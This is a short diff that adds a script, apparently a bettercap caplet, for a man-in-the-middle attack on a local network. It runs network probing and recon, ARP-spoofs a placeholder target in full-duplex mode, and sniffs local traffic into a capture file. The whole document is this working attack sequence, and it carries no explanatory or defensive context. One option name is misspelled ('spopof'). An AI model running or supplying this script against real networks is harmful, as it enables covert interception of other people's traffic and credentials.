@@ -1,0 +1,8 @@
+net.probe on
+net.recon on
+set arp.spopof.fullplex true
+set arp.spoof.targets <target ip/mac>
+arp.spoof on
+set net.sniff.local true
+set net.sniff.output mycapture.cap
+net.sniff on
